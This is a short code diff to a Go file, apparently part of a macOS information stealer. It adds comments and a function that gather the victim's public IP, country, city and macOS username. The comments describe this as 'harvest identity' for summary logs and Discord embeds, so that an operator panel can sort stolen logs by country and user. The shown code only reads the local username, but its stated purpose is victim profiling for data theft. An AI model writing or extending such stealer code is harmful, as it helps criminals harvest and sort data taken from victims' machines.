@@ -1,3 +1,8 @@
+// victim_info.go — public IP / geo and local macOS username for harvest identity.
+//
+// Used in summary.txt and Discord embeds so the panel can group logs by country
+// and user. Network lookups are best-effort and time-bounded; harvest continues
+// if geo lookup fails.
 package main
 
 import (
@@ -9,8 +14,10 @@ import (
 	"time"
 )
 
+// Short timeout: never block harvest long for identity enrichment.
 const victimInfoTimeout = 6 * time.Second
 
+// collectVictimInfo returns public IP, country fields, and the macOS account name.
 func collectVictimInfo() (publicIP, country, countryCode, city, macUser string) {
 	if u, err := user.Current(); err == nil {
 		macUser = strings.TrimSpace(u.Username)
